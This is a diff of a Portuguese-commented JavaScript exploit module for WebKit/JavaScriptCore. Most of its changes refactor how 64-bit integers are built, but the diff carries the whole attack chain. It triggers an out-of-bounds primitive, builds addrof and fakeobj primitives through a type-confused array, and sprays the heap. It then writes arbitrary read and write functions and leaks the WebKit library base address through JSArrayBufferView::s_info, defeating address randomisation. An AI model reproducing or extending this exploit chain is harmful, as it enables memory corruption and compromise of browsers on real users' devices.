@@ -4,16 +4,20 @@
 // - Substitui TODAS as chamadas a 'new AdvancedInt64(low, high)' por 'AdvancedInt64.fromParts(low, high)'
 //   em testArrayBufferVictimCrash.mjs. Isso visa evitar o construtor problemático.
 // - Isso inclui chamadas para valores literais e resultados de operações.
+// - AGORA TAMBÉM GARANTE QUE 'new AdvancedInt64(single_arg)' para valores como
+//   WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST é substituída por
+//   'AdvancedInt64.fromParts()' usando uma função auxiliar para parsing da string hexadecimal.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+// Importa a nova função hexStringToParts
+import { AdvancedInt64, toHex, isAdvancedInt64Object, hexStringToParts } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView,
-    oob_read_absolute, 
+    oob_read_absolute,
     oob_write_absolute,
-    getOOBAllocationSize 
+    getOOBAllocationSize
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
@@ -40,32 +44,34 @@ function doubleToInt64(double) {
     if (!Number.isInteger(low) || low < 0 || low > 0xFFFFFFFF ||
         !Number.isInteger(high) || high < 0 || high > 0xFFFFFFFF) {
         logS3(`ALERTA: doubleToInt64 recebeu double (${double}) que resultou em low: ${toHex(low)}, high: ${toHex(high)}. Retornando AdvancedInt64.Zero.`, "warn");
-        return AdvancedInt64.Zero; 
+        return AdvancedInt64.Zero;
     }
-    return AdvancedInt64.fromParts(low, high); 
+    return AdvancedInt64.fromParts(low, high);
 }
 
 // =======================================================================================
 // FUNÇÃO: DECODIFICAR PONTEIRO COMPRIMIDO (HIPOTÉTICO)
 // =======================================================================================
 function decodeCompressedPointer(leakedAddr) {
-    // Usar AdvancedInt64.fromParts para o assumed_heap_base_for_decompression também
+    // Usar AdvancedInt64.fromParts para o assumed_heap_base_for_decompression
+    // Convertendo a string hexadecimal em partes low e high
+    const assumed_base_parts = hexStringToParts(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
     const assumed_heap_base_for_decompression = AdvancedInt64.fromParts(
-        new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST).low(),
-        new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST).high()
+        assumed_base_parts.low,
+        assumed_base_parts.high
     );
-    
-    const compressed_offset_32bit = leakedAddr.low(); 
-    
-    const offset_as_int64 = AdvancedInt64.fromParts(compressed_offset_32bit, 0); 
-    
+
+    const compressed_offset_32bit = leakedAddr.low();
+
+    const offset_as_int64 = AdvancedInt64.fromParts(compressed_offset_32bit, 0);
+
     const decoded_ptr = assumed_heap_base_for_decompression.add(offset_as_int64);
-    
+
     logS3(`    [PointerDecode] Endereço comprimido/taggeado recebido: ${leakedAddr.toString(true)}`, "debug");
     logS3(`    [PointerDecode] Offset de 32 bits extraído (low): ${toHex(compressed_offset_32bit)}`, "debug");
     logS3(`    [PointerDecode] Base de heap assumida para descompressão: ${assumed_heap_base_for_decompression.toString(true)}`, "debug");
     logS3(`    [PointerDecode] Endereço decodificado (hipotético): ${decoded_ptr.toString(true)}`, "info");
-    
+
     return decoded_ptr;
 }
 
@@ -86,31 +92,31 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let confused_array;
     let victim_array;
     let addrof_func;
-    let fakeobj_func; 
+    let fakeobj_func;
 
     // A primitiva arbitrária real será baseada no Uint8Array corruptível
-    let arb_rw_array = null; 
+    let arb_rw_array = null;
 
     // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
     let arb_read_stable = null;
     let arb_write_stable = null;
 
     // Definir a constante localmente
-    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
+    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
 
     try {
         // Helper para definir as primitivas addrof/fakeobj.
         const setupAddrofFakeobj = () => {
-            confused_array = [13.37]; 
-            victim_array = [{ dummy: 0 }]; 
-            
+            confused_array = [13.37];
+            victim_array = [{ dummy: 0 }];
+
             addrof_func = (obj) => {
                 victim_array[0] = obj;
                 // addrof_func vai retornar o ponteiro comprimido/taggeado
                 return doubleToInt64(confused_array[0]);
             };
-            fakeobj_func = (addr) => { 
-                confused_array[0] = int64ToDouble(addr); 
+            fakeobj_func = (addr) => {
+                confused_array[0] = int64ToDouble(addr);
                 return victim_array[0];
             };
         };
@@ -118,21 +124,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
         logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true }); 
+        await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
-        setupAddrofFakeobj(); 
-        
+        setupAddrofFakeobj();
+
         let leaker_phase4 = { obj_prop: null, val_prop: 0 };
-        const arb_read_phase4 = (addr, size_bytes = 8) => { 
-            leaker_phase4.obj_prop = fakeobj_func(addr); 
+        const arb_read_phase4 = (addr, size_bytes = 8) => {
+            leaker_phase4.obj_prop = fakeobj_func(addr);
             const result_64 = doubleToInt64(leaker_phase4.val_prop);
             return (size_bytes === 4) ? result_64.low() : result_64;
         };
-        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
+        const arb_write_phase4 = (addr, value, size_bytes = 8) => {
             leaker_phase4.obj_prop = fakeobj_func(addr);
             if (size_bytes === 4) {
-                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
+                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF;
             } else {
                 leaker_phase4.val_prop = int64ToDouble(value);
             }
@@ -143,9 +149,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
         const spray_phase4 = [];
         for (let i = 0; i < 1000; i++) {
-            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
+            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i * 2, d: i * 3 });
         }
-        const test_obj_phase4 = spray_phase4[500]; 
+        const test_obj_phase4 = spray_phase4[500];
         logS3("Spray de 1000 objetos concluído para estabilização.", "info");
 
         // Obter o endereço COMPRIMIDO/TAGGEADO do test_obj_phase4
@@ -155,7 +161,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // Decodificar o endereço para uso na primitiva L/E
         const test_obj_addr_phase4_decoded = decodeCompressedPointer(test_obj_addr_phase4_compressed);
         logS3(`(Verificação Fase 4) Endereço DECODIFICADO do test_obj_phase4: ${test_obj_addr_phase4_decoded.toString(true)}`, "leak");
-        
+
         // Validação da decodificação na Fase 4: O endereço decodificado deve ser um ponteiro 0x7FFF...
         if (test_obj_addr_phase4_decoded.equals(AdvancedInt64.Zero) || (test_obj_addr_phase4_decoded.high() >>> 16) !== 0x7FFF) {
             throw new Error(`FALHA CRÍTICA: Endereço DECODIFICADO na Fase 4 é inválido (${test_obj_addr_phase4_decoded.toString(true)}). A lógica de decodificação de ponteiro está incorreta.`);
@@ -163,41 +169,41 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`(Verificação Fase 4) Endereço decodificado válido. Prosseguindo com teste L/E.`, "good");
 
         const prop_a_addr_phase4 = test_obj_addr_phase4_decoded.add(AdvancedInt64.fromParts(0x10, 0)); // Usar fromParts para 0x10
-        const value_to_write_phase4 = AdvancedInt64.fromParts(0x12345678, 0xABCDEF01); 
+        const value_to_write_phase4 = AdvancedInt64.fromParts(0x12345678, 0xABCDEF01);
 
         logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço DECODIFICADO ${prop_a_addr_phase4.toString(true)}...`, "info");
-        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4); 
+        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);
 
-        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4); 
+        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
         logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");
 
         if (!value_read_phase4.equals(value_to_write_phase4)) {
             throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}. (Problema de decodificação de ponteiro?)`);
         }
         logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
-        await PAUSE_S3(50); 
+        await PAUSE_S3(50);
 
         // ============================================================================
         // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (AGORA COM DECODIFICAÇÃO DE PONTEIRO)
         // ============================================================================
         logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (COM DECODIFICAÇÃO DE PONTEIRO) ---", "subtest");
-        
-        leaker_phase4 = null; 
-        await PAUSE_S3(200); 
+
+        leaker_phase4 = null;
+        await PAUSE_S3(200);
 
         logS3("Ambiente OOB existente será reutilizado. Primitivas addrof/fakeobj da Fase 4 serão reutilizadas.", "good");
 
         logS3("--- Warm-up: PULADO, Primitivas da Fase 4 estão sendo reutilizadas. ---", "info");
-        await PAUSE_S3(50); 
+        await PAUSE_S3(50);
 
         // Criar o arb_rw_array. Ele será alocado no heap.
-        arb_rw_array = new Uint8Array(0x1000); 
+        arb_rw_array = new Uint8Array(0x1000);
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
         // OBTEM O ENDEREÇO COMPRIMIDO DO ARRAYBUFFERVIEW DE arb_rw_array USANDO addrof_func.
-        const arb_rw_array_ab_view_addr_compressed = addrof_func(arb_rw_array); 
+        const arb_rw_array_ab_view_addr_compressed = addrof_func(arb_rw_array);
         logS3(`    Endereço COMPRIMIDO do ArrayBufferView de arb_rw_array (obtido via addrof_func): ${arb_rw_array_ab_view_addr_compressed.toString(true)}`, "leak");
-        
+
         // Decodificar o endereço comprimido para o endereço real de 64 bits.
         const arb_rw_array_ab_view_addr_decoded = decodeCompressedPointer(arb_rw_array_ab_view_addr_compressed);
         logS3(`    Endereço DECODIFICADO do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr_decoded.toString(true)}`, "leak");
@@ -216,19 +222,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // devem usar `fakeobj_func` com o endereço decodificado para leitura/escrita arbitrária.
 
         arb_read_stable = (address, size_bytes) => {
-            const temp_leaker = { obj_prop: null, val_prop: 0 }; 
+            const temp_leaker = { obj_prop: null, val_prop: 0 };
             // fakeobj_func agora aceita o 'address' bruto (já decodificado)
-            temp_leaker.obj_prop = fakeobj_func(address); 
+            temp_leaker.obj_prop = fakeobj_func(address);
             const result_64 = doubleToInt64(temp_leaker.val_prop);
             return (size_bytes === 4) ? result_64.low() : result_64;
         };
 
         arb_write_stable = (address, value, size_bytes) => {
-            const temp_leaker = { obj_prop: null, val_prop: 0 }; 
+            const temp_leaker = { obj_prop: null, val_prop: 0 };
             // fakeobj_func agora aceita o 'address' bruto
-            temp_leaker.obj_prop = fakeobj_func(address); 
+            temp_leaker.obj_prop = fakeobj_func(address);
             if (size_bytes === 4) {
-                temp_leaker.val_prop = Number(value) & 0xFFFFFFFF; 
+                temp_leaker.val_prop = Number(value) & 0xFFFFFFFF;
             } else {
                 temp_leaker.val_prop = int64ToDouble(value);
             }
@@ -241,16 +247,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // FASE FINAL: VAZAR BASE WEBKIT LENDO DE SÍMBOLO GLOBAL CONHECIDO (USANDO arb_read_stable)
         // ============================================================================
         logS3("--- FASE 6: VAZAMENTO DE WEBKIT BASE LENDO DE SÍMBOLO GLOBAL CONHECIDO (com arb_read_stable) ---", "subtest");
-        
-        const assumed_webkit_base = new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST); 
+
+        // Usar hexStringToParts para criar a AdvancedInt64 a partir da string hexadecimal
+        const assumed_webkit_base_parts = hexStringToParts(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
+        const assumed_webkit_base = AdvancedInt64.fromParts(assumed_webkit_base_parts.low, assumed_webkit_base_parts.high);
         logS3(`[ASSUNÇÃO] Usando base da WebKit assumida para teste: ${assumed_webkit_base.toString(true)}`, "warn");
 
-        const s_info_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"]);
+        const s_info_offset = AdvancedInt64.fromParts(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"].low, WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"].high);
         const s_info_address = assumed_webkit_base.add(s_info_offset);
         logS3(`[Etapa 1] Endereço de JSC::JSArrayBufferView::s_info (assumido): ${s_info_address.toString(true)}`, "info");
 
         // Agora, tente ler um QWORD (ponteiro) do s_info usando a primitiva estável.
-        const s_info_val = arb_read_stable(s_info_address, 8); 
+        const s_info_val = arb_read_stable(s_info_address, 8);
         logS3(`[Etapa 2] Valor lido de JSC::JSArrayBufferView::s_info: ${s_info_val.toString(true)}`, "leak");
 
         // Validação: O valor lido deve ser um ponteiro válido para a WebKit (0x7FFF...)
@@ -260,15 +268,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`[Etapa 2] Leitura de s_info bem-sucedida! Isso confirma que a primitiva de L/E pode ler em endereços arbitrários.`, "good");
 
         // Calcular o endereço base da WebKit.
-        const webkit_base_addr = s_info_val.sub(s_info_offset); 
+        const webkit_base_addr = s_info_val.sub(s_info_offset);
         final_result.webkit_base_addr = webkit_base_addr.toString(true);
 
         if (webkit_base_addr.equals(AdvancedInt64.Zero) || (webkit_base_addr.high() >>> 16) !== 0x7FFF) {
-             throw new Error(`FALHA CRÍTICA: Endereço Base da WebKit calculado (${webkit_base_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
+            throw new Error(`FALHA CRÍTICA: Endereço Base da WebKit calculado (${webkit_base_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
         }
 
         logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
-        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");
+        logS3(`    ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");
 
         final_result.success = true;
         final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;
@@ -282,10 +290,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         victim_array = null;
         addrof_func = null;
         fakeobj_func = null;
-        arb_rw_array = null; 
+        arb_rw_array = null;
         arb_read_stable = null;
         arb_write_stable = null;
-        
+
         logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
     }
 
